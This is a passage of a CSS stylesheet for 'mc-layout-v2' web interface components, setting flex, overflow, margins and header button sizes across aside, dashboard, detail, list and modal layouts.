        mc-layout-list-two-columns.mc-layout-v2 .mc-flex-shrink,
        mc-layout-modal-simple.mc-layout-v2 .mc-flex-shrink {
            flex: 0 0 auto;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-flex-stretcher,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-flex-stretcher,
        mc-layout-aside-simple.mc-layout-v2 .mc-flex-stretcher,
        mc-layout-aside-tabs.mc-layout-v2 .mc-flex-stretcher,
        mc-help-container.mc-layout-v2 .mc-flex-stretcher,
        mc-body-container.mc-layout-v2 .mc-flex-stretcher,
        mc-extra-container.mc-layout-v2 .mc-flex-stretcher,
        mc-side-container.mc-layout-v2 .mc-flex-stretcher,
        mc-footer-container.mc-layout-v2 .mc-flex-stretcher,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-flex-stretcher,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-flex-stretcher,
        mc-layout-detail-simple.mc-layout-v2 .mc-flex-stretcher,
        mc-layout-detail-tabs.mc-layout-v2 .mc-flex-stretcher,
        mc-layout-detail-wizard.mc-layout-v2 .mc-flex-stretcher,
        mc-layout-list-extra-container.mc-layout-v2 .mc-flex-stretcher,
        mc-layout-list-simple.mc-layout-v2 .mc-flex-stretcher,
        mc-layout-list-table.mc-layout-v2 .mc-flex-stretcher,
        mc-layout-list-tabs.mc-layout-v2 .mc-flex-stretcher,
        mc-layout-list-two-columns.mc-layout-v2 .mc-flex-stretcher,
        mc-layout-modal-simple.mc-layout-v2 .mc-flex-stretcher {
            flex: 1 1 auto;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-flex-column,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-flex-column,
        mc-layout-aside-simple.mc-layout-v2 .mc-flex-column,
        mc-layout-aside-tabs.mc-layout-v2 .mc-flex-column,
        mc-help-container.mc-layout-v2 .mc-flex-column,
        mc-body-container.mc-layout-v2 .mc-flex-column,
        mc-extra-container.mc-layout-v2 .mc-flex-column,
        mc-side-container.mc-layout-v2 .mc-flex-column,
        mc-footer-container.mc-layout-v2 .mc-flex-column,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-flex-column,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-flex-column,
        mc-layout-detail-simple.mc-layout-v2 .mc-flex-column,
        mc-layout-detail-tabs.mc-layout-v2 .mc-flex-column,
        mc-layout-detail-wizard.mc-layout-v2 .mc-flex-column,
        mc-layout-list-extra-container.mc-layout-v2 .mc-flex-column,
        mc-layout-list-simple.mc-layout-v2 .mc-flex-column,
        mc-layout-list-table.mc-layout-v2 .mc-flex-column,
        mc-layout-list-tabs.mc-layout-v2 .mc-flex-column,
        mc-layout-list-two-columns.mc-layout-v2 .mc-flex-column,
        mc-layout-modal-simple.mc-layout-v2 .mc-flex-column {
            flex-direction: column;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-flex-scroll,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-flex-scroll,
        mc-layout-aside-simple.mc-layout-v2 .mc-flex-scroll,
        mc-layout-aside-tabs.mc-layout-v2 .mc-flex-scroll,
        mc-help-container.mc-layout-v2 .mc-flex-scroll,
        mc-body-container.mc-layout-v2 .mc-flex-scroll,
        mc-extra-container.mc-layout-v2 .mc-flex-scroll,
        mc-side-container.mc-layout-v2 .mc-flex-scroll,
        mc-footer-container.mc-layout-v2 .mc-flex-scroll,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-flex-scroll,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-flex-scroll,
        mc-layout-detail-simple.mc-layout-v2 .mc-flex-scroll,
        mc-layout-detail-tabs.mc-layout-v2 .mc-flex-scroll,
        mc-layout-detail-wizard.mc-layout-v2 .mc-flex-scroll,
        mc-layout-list-extra-container.mc-layout-v2 .mc-flex-scroll,
        mc-layout-list-simple.mc-layout-v2 .mc-flex-scroll,
        mc-layout-list-table.mc-layout-v2 .mc-flex-scroll,
        mc-layout-list-tabs.mc-layout-v2 .mc-flex-scroll,
        mc-layout-list-two-columns.mc-layout-v2 .mc-flex-scroll,
        mc-layout-modal-simple.mc-layout-v2 .mc-flex-scroll {
            overflow: auto;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-flex-scroll-vertical,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-flex-scroll-vertical,
        mc-layout-aside-simple.mc-layout-v2 .mc-flex-scroll-vertical,
        mc-layout-aside-tabs.mc-layout-v2 .mc-flex-scroll-vertical,
        mc-help-container.mc-layout-v2 .mc-flex-scroll-vertical,
        mc-body-container.mc-layout-v2 .mc-flex-scroll-vertical,
        mc-extra-container.mc-layout-v2 .mc-flex-scroll-vertical,
        mc-side-container.mc-layout-v2 .mc-flex-scroll-vertical,
        mc-footer-container.mc-layout-v2 .mc-flex-scroll-vertical,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-flex-scroll-vertical,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-flex-scroll-vertical,
        mc-layout-detail-simple.mc-layout-v2 .mc-flex-scroll-vertical,
        mc-layout-detail-tabs.mc-layout-v2 .mc-flex-scroll-vertical,
        mc-layout-detail-wizard.mc-layout-v2 .mc-flex-scroll-vertical,
        mc-layout-list-extra-container.mc-layout-v2 .mc-flex-scroll-vertical,
        mc-layout-list-simple.mc-layout-v2 .mc-flex-scroll-vertical,
        mc-layout-list-table.mc-layout-v2 .mc-flex-scroll-vertical,
        mc-layout-list-tabs.mc-layout-v2 .mc-flex-scroll-vertical,
        mc-layout-list-two-columns.mc-layout-v2 .mc-flex-scroll-vertical,
        mc-layout-modal-simple.mc-layout-v2 .mc-flex-scroll-vertical {
            overflow-y: auto;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-flex-custom-width,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-flex-custom-width,
        mc-layout-aside-simple.mc-layout-v2 .mc-flex-custom-width,
        mc-layout-aside-tabs.mc-layout-v2 .mc-flex-custom-width,
        mc-help-container.mc-layout-v2 .mc-flex-custom-width,
        mc-body-container.mc-layout-v2 .mc-flex-custom-width,
        mc-extra-container.mc-layout-v2 .mc-flex-custom-width,
        mc-side-container.mc-layout-v2 .mc-flex-custom-width,
        mc-footer-container.mc-layout-v2 .mc-flex-custom-width,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-flex-custom-width,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-flex-custom-width,
        mc-layout-detail-simple.mc-layout-v2 .mc-flex-custom-width,
        mc-layout-detail-tabs.mc-layout-v2 .mc-flex-custom-width,
        mc-layout-detail-wizard.mc-layout-v2 .mc-flex-custom-width,
        mc-layout-list-extra-container.mc-layout-v2 .mc-flex-custom-width,
        mc-layout-list-simple.mc-layout-v2 .mc-flex-custom-width,
        mc-layout-list-table.mc-layout-v2 .mc-flex-custom-width,
        mc-layout-list-tabs.mc-layout-v2 .mc-flex-custom-width,
        mc-layout-list-two-columns.mc-layout-v2 .mc-flex-custom-width,
        mc-layout-modal-simple.mc-layout-v2 .mc-flex-custom-width {
            flex: 0 0 50vh;
            min-width: 350px;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-full-height,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-full-height,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-full-height,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-full-height,
        mc-help-container.mc-layout-v2 .mc-layout-full-height,
        mc-body-container.mc-layout-v2 .mc-layout-full-height,
        mc-extra-container.mc-layout-v2 .mc-layout-full-height,
        mc-side-container.mc-layout-v2 .mc-layout-full-height,
        mc-footer-container.mc-layout-v2 .mc-layout-full-height,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-full-height,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-full-height,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-full-height,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-full-height,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-full-height,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-full-height,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-full-height,
        mc-layout-list-table.mc-layout-v2 .mc-layout-full-height,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-full-height,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-full-height,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-full-height {
            height: 100%;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-full-height-no-overflow,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-full-height-no-overflow,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-full-height-no-overflow,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-full-height-no-overflow,
        mc-help-container.mc-layout-v2 .mc-layout-full-height-no-overflow,
        mc-body-container.mc-layout-v2 .mc-layout-full-height-no-overflow,
        mc-extra-container.mc-layout-v2 .mc-layout-full-height-no-overflow,
        mc-side-container.mc-layout-v2 .mc-layout-full-height-no-overflow,
        mc-footer-container.mc-layout-v2 .mc-layout-full-height-no-overflow,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-full-height-no-overflow,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-full-height-no-overflow,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-full-height-no-overflow,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-full-height-no-overflow,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-full-height-no-overflow,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-full-height-no-overflow,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-full-height-no-overflow,
        mc-layout-list-table.mc-layout-v2 .mc-layout-full-height-no-overflow,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-full-height-no-overflow,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-full-height-no-overflow,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-full-height-no-overflow {
            height: 100%;
            overflow-y: hidden;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-header,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-header,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-header,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-header,
        mc-help-container.mc-layout-v2 .mc-layout-header,
        mc-body-container.mc-layout-v2 .mc-layout-header,
        mc-extra-container.mc-layout-v2 .mc-layout-header,
        mc-side-container.mc-layout-v2 .mc-layout-header,
        mc-footer-container.mc-layout-v2 .mc-layout-header,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-header,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-header,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-header,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-header,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-header,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-header,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-header,
        mc-layout-list-table.mc-layout-v2 .mc-layout-header,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-header,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-header,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-header {
            flex: 0 0 auto;
            margin: 15px 15px 0;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item,
        mc-help-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item,
        mc-body-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item,
        mc-extra-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item,
        mc-side-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item,
        mc-footer-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-header .mc-layout-header-item,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item,
        mc-layout-list-table.mc-layout-v2 .mc-layout-header .mc-layout-header-item,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-header .mc-layout-header-item,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item {
            margin-left: 11.25px;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item.mc-helper-item-container,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item.mc-helper-item-container,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item.mc-helper-item-container,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item.mc-helper-item-container,
        mc-help-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item.mc-helper-item-container,
        mc-body-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item.mc-helper-item-container,
        mc-extra-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item.mc-helper-item-container,
        mc-side-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item.mc-helper-item-container,
        mc-footer-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item.mc-helper-item-container,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item.mc-helper-item-container,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item.mc-helper-item-container,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item.mc-helper-item-container,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item.mc-helper-item-container,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-header .mc-layout-header-item.mc-helper-item-container,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item.mc-helper-item-container,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item.mc-helper-item-container,
        mc-layout-list-table.mc-layout-v2 .mc-layout-header .mc-layout-header-item.mc-helper-item-container,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item.mc-helper-item-container,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-header .mc-layout-header-item.mc-helper-item-container,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item.mc-helper-item-container {
            position: relative;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item i,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item i,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item i,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item i,
        mc-help-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item i,
        mc-body-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item i,
        mc-extra-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item i,
        mc-side-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item i,
        mc-footer-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item i,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item i,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item i,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item i,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item i,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-header .mc-layout-header-item i,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item i,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item i,
        mc-layout-list-table.mc-layout-v2 .mc-layout-header .mc-layout-header-item i,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item i,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-header .mc-layout-header-item i,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item i {
            color: #666666;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn,
        mc-help-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn,
        mc-body-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn,
        mc-extra-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn,
        mc-side-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn,
        mc-footer-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn,
        mc-layout-list-table.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn {
            padding: 0 4px 2px 4px;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn i,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn i,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn i,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn i,
        mc-help-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn i,
        mc-body-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn i,
        mc-extra-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn i,
        mc-side-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn i,
        mc-footer-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn i,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn i,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn i,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn i,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn i,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn i,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn i,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn i,
        mc-layout-list-table.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn i,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn i,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn i,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-favourite-item.btn i {
            padding: 0;
            font-size: 20px;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn,
        mc-help-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn,
        mc-body-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn,
        mc-extra-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn,
        mc-side-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn,
        mc-footer-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn,
        mc-layout-list-table.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn {
            padding: 4px 8px 2px 8px;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn i,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn i,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn i,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn i,
        mc-help-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn i,
        mc-body-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn i,
        mc-extra-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn i,
        mc-side-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn i,
        mc-footer-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn i,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn i,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn i,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn i,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn i,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn i,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn i,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn i,
        mc-layout-list-table.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn i,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn i,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn i,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-header .mc-layout-header-item .mc-helper-item.btn i {
            padding: 0 1px 0 0;
            font-size: 22px;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-extra-container,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-extra-container,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-extra-container,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-extra-container,
        mc-help-container.mc-layout-v2 .mc-layout-extra-container,
        mc-body-container.mc-layout-v2 .mc-layout-extra-container,
        mc-extra-container.mc-layout-v2 .mc-layout-extra-container,
        mc-side-container.mc-layout-v2 .mc-layout-extra-container,
        mc-footer-container.mc-layout-v2 .mc-layout-extra-container,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-extra-container,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-extra-container,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-extra-container,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-extra-container,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-extra-container,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-extra-container,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-extra-container,
        mc-layout-list-table.mc-layout-v2 .mc-layout-extra-container,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-extra-container,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-extra-container,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-extra-container {
            flex: 0 0 auto;
            margin: 15px 15px 0;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-empty-results-container,
        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-body-container,
        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-columns,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-empty-results-container,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-body-container,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-columns,
        mc-layout-aside-simple.mc-layout-v2 .mc-empty-results-container,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-body-container,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-columns,
        mc-layout-aside-tabs.mc-layout-v2 .mc-empty-results-container,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-body-container,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-columns,
        mc-help-container.mc-layout-v2 .mc-empty-results-container,
        mc-help-container.mc-layout-v2 .mc-layout-body-container,
        mc-help-container.mc-layout-v2 .mc-layout-columns,
        mc-body-container.mc-layout-v2 .mc-empty-results-container,
        mc-body-container.mc-layout-v2 .mc-layout-body-container,
        mc-body-container.mc-layout-v2 .mc-layout-columns,
        mc-extra-container.mc-layout-v2 .mc-empty-results-container,
        mc-extra-container.mc-layout-v2 .mc-layout-body-container,
        mc-extra-container.mc-layout-v2 .mc-layout-columns,
        mc-side-container.mc-layout-v2 .mc-empty-results-container,
        mc-side-container.mc-layout-v2 .mc-layout-body-container,
        mc-side-container.mc-layout-v2 .mc-layout-columns,
        mc-footer-container.mc-layout-v2 .mc-empty-results-container,
        mc-footer-container.mc-layout-v2 .mc-layout-body-container,
        mc-footer-container.mc-layout-v2 .mc-layout-columns,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-empty-results-container,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-body-container,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-columns,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-empty-results-container,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-body-container,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-columns,
        mc-layout-detail-simple.mc-layout-v2 .mc-empty-results-container,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-body-container,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-columns,
        mc-layout-detail-tabs.mc-layout-v2 .mc-empty-results-container,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-body-container,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-columns,
        mc-layout-detail-wizard.mc-layout-v2 .mc-empty-results-container,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-body-container,
